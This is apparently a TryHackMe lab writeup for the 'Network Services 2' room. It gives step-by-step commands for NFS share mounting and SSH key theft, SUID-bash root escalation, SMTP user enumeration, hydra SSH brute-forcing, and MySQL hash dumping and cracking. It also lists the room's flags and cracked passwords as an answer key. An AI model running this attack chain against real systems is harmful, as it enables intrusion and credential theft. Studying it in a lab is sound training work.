---
layout: post
title: Network Services 2 Room Writeup
categories: [TryHackMe]
tags: [Writeup]
---

# TryHackMe: Network Services 2 Room Writeup

> Enumerating and Exploiting More Common Network Services & Misconfigurations

### Task 2

**What does NFS stand for?**

> Network File System

**What process allows an NFS client to 
interact with a remote directory as though it was a physical device?**

> mounting

**What does NFS use to represent files and directories on the server?**

> file handle

**What protocol does NFS use to communicate between the server and client?**

> RPC

**What two pieces of user data does the NFS server take as parameters for 
controlling user permissions? Format: parameter 1 / parameter 2**

> user ID / group ID

**Can a Windows NFS server share files with a Linux client? (Y/N)**

> Y

**Can a Linux NFS server share files with a MacOS client? (Y/N)**

> Y

**What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.**

> 4.2

### Task 3

**Conduct a thorough port scan scan of your choosing, how many ports are open?**

In practice, when you use nmap to scan a huge range of ports, it can take really a long time. So instead of setting up a huge port range, we can divide it into several ranges to make the scanning time short.

```
nmap -A -p1-10000 10.10.186.1
nmap -A -p10001-20000 10.10.186.1
nmap -A -p20001-30000 10.10.186.1
nmap -A -p30001-40000 10.10.186.1
nmap -A -p40001-50000 10.10.186.1
```

> 7

**Which port contains the service we're looking to enumerate?**

> 2049

**Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?**

```
showmount -e 10.10.186.1
```

> /home

**Change directory to where you mounted the share- what is the name of the folder inside?**

```
mkdir /tmp/mount
mount -t nfs 10.10.186.1:/home /tmp/mount/ -nolock
cd /tmp/mount/
ls
```

> cappucino

**Which of these folders could contain keys that would give us remote access to the server?**

> .ssh

**Which of these keys is most useful to us?**

> id_rsa

**Can we log into the machine using *ssh -i <key-file> <username>@<ip>* ? (Y/N)**

```
cp id_rsa ~
cd ~
chmod 600 id_rsa
ssh -i id_rsa cappucino@10.10.186.1
```

> Y

### Task 4

**Now, we're going to add the SUID bit permission to the bash executable 
we just copied to the share using "sudo chmod +[permission] bash". What 
letter do we use to set the SUID bit set using chmod?**

```
chmod +s bash
```

> s

**Let's do a sanity check, let's check the
 permissions of the "bash" executable using "ls -la bash". What does the
 permission set look like? Make sure that it ends with -sr-x.**

```
chmod +x bash
ls -la bash
```

> rwsr-sr-x

**Now, SSH into the machine as the 
user. List the directory to make sure the bash executable is there. Now,
 the moment of truth. Lets run it with "*./bash -p*". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.**

```
ssh -i id_rsa cappucino@10.10.186.1
./bash -p
```

Now we have entered into a root shell.

> No answer needed

**Great! If all's gone well you should have a shell as root! What's the root flag?**

Change to root home directory, then you can find a text file containing the flag.

```
cd /root
cat root.txt
```

> THM{nfs_got_pwned}

### Task 5

**What does SMTP stand for?**

> Simple Mail Transfer Protocol

**What does SMTP handle the sending of? (answer in plural)**

> emails

**What is the first step in the SMTP process?**

> SMTP handshake

**What is the default SMTP port?**

> 25

**Where does the SMTP server send the email if the recipient's server is not available?**

> SMTP queue

**On what server does the Email ultimately end up on?**

> POP/IMAP

**Can a Linux machine run an SMTP server? (Y/N)**

> Y

**Can a Windows machine run an SMTP server? (Y/N)**

> Y

### Task 6

**First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?**

```
nmap -A -p1-10000 10.10.59.93
```

> 25

**Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?**

**If
 you would like some more help, or practice using, Metasploit, Darkstar 
has an amazing room on Metasploit that you can check out here:**

https://tryhackme.com/room/rpmetasploit

```
msfconsole
```

> msfconsole

**Let's search for the module "smtp_version", what's it's full module name?**

```
search smtp_version
```

> auxiliary/scanner/smtp/smtp_version

**Great, now- select the module and list the options. How do we do this?**

```
options auxiliary/scanner/smtp/smtp_version
```

> options

**Have a look through the options, does everything seem correct? What is the option we need to set?**

> RHOSTS

**Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?**

```
set RHOSTS 10.10.59.93
use auxiliary/scanner/smtp/smtp_version
exploit
```

> polosmtp.home

**What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.**

> Postfix

**Good! We've now got a good amount of 
information on the target system to move onto the next stage. Let's 
search for the module "*smtp_enum*", what's it's full module name?**

```
search smtp_enum
```

> auxiliary/scanner/smtp/smtp_enum

**We're going to be using the *"top-usernames-shortlist.txt"* wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).**

**Seclists
 is an amazing collection of wordlists. If you're running Kali or Parrot
 you can install seclists with: "sudo apt install seclists" 
Alternatively, you can download the repository from [here](https://github.com/danielmiessler/SecLists).**

**What option do we need to set to the wordlist's path?**

```
options auxiliary/scanner/smtp/smtp_enum
set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
```

> USER_FILE

**Once we've set this option, what is the other essential paramater we need to set?**

```
set RHOSTS 10.10.59.93
```

> RHOSTS

**Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!**

```
use auxiliary/scanner/smtp/smtp_enum
exploit
```

> No answer needed

**Okay! Now that's finished, what username is returned?**

> administrator

### Task 7

**What is the password of the user we found during our enumeration stage?**

```
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.59.93 ssh
```

> alejandro

**Great! Now, let's SSH into the server as the user, what is contents of smtp.txt**

```
ssh administrator@10.10.59.93
cat smtp.txt
```

> THM{who_knew_email_servers_were_c00l?}

### Task 8

**What type of software is MySQL?**

> relational database management system

**What language is MySQL based on?**

> SQL

**What communication model does MySQL use?**

> client-server

**What is a common application of MySQL?**

> back end database

**What major social network uses MySQL as their back-end database? This will require further research.**

This question mentions social network, so what first came into my mind was facebook, and the answer sure is facebook.

> facebook

### Task 9

**As always, let's start out with a port 
scan, so we know what port the service we're trying to attack is running
 on. What port is MySQL using?**

```
nmap -A -p1-10000 10.10.118.254
```

> 3306

**Good, now- we think we have a set of 
credentials. Let's double check that by manually connecting to the MySQL
 server. We can do this using the command "*mysql -h [IP] -u [username] -p*"**

```
apt install default-mysql-client
mysql -h 10.10.118.254 -u root -p
```

> No answer needed

**We're going to be using the "mysql_sql" module.**

**Search for, select and list the options it needs. What three options do we need to set? (in descending order).**

```
msfconsole
search mysql_sql
options auxiliary/admin/mysql/mysql_sql
```

> PASSWORD/username/RHOSTS

**Run the exploit. By default it will test
 with the "select version()" command, what result does this give you?**

```
set PASSWORD password
set username root
set RHOSTS 10.10.118.254
use auxiliary/admin/mysql/mysql_sql
exploit
```

> 5.7.29-0ubuntu0.18.04.1

**Great! We know that our exploit is 
landing as planned. Let's try to gain some more ambitious information. 
Change the "sql" option to "show databases". how many databases are 
returned?**

```
set SQL show databases
exploit
```

> 4

### Task 10

**First, let's search for and select the "mysql_schemadump" module. What's the module's full name?**

```
search mysql_schemadump
```

> auxiliary/scanner/mysql/mysql_schemadump

**Great! Now, you've done this a few times by now so I'll let you take it 
from here. Set the relevant options, run the exploit. What's the name of
 the last table that gets dumped?**

```
use auxiliary/scanner/mysql/mysql_schemadump
exploit
```

> x$waits_global_by_latency

**Awesome, you have now dumped the tables,
 and column names of the whole database. But we can do one better... 
search for and select the "mysql_hashdump" module. What's the module's 
full name?**

```
search mysql_hashdump
```

> auxiliary/scanner/mysql/mysql_hashdump

**Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?**

```
use auxiliary/scanner/mysql/mysql_hashdump
exploit
```

> carl

**Another user! And we have their 
password hash. This could be very interesting. Copy the hash string in 
full, like: bob:*HASH to a text file on your local machine called 
"hash.txt".**

**What is the user/hash combination string?**

> carl:*EA031893AA21444B170FC2162A56978B8CEECE18

**Now, we need to crack the password! Let's try John the Ripper against it using: "*john hash.txt*" what is the password of the user we found?**

```
john hash.txt
```

> doggie

**Awesome. Password reuse is not only 
extremely dangerous, but extremely common. What are the chances that 
this user has reused their password for a different service?**

**What's the contents of MySQL.txt**

```
ssh carl@10.10.118.254
ls
cat MySQL.txt
```

> THM{congratulations_you_got_the_mySQL_flag}
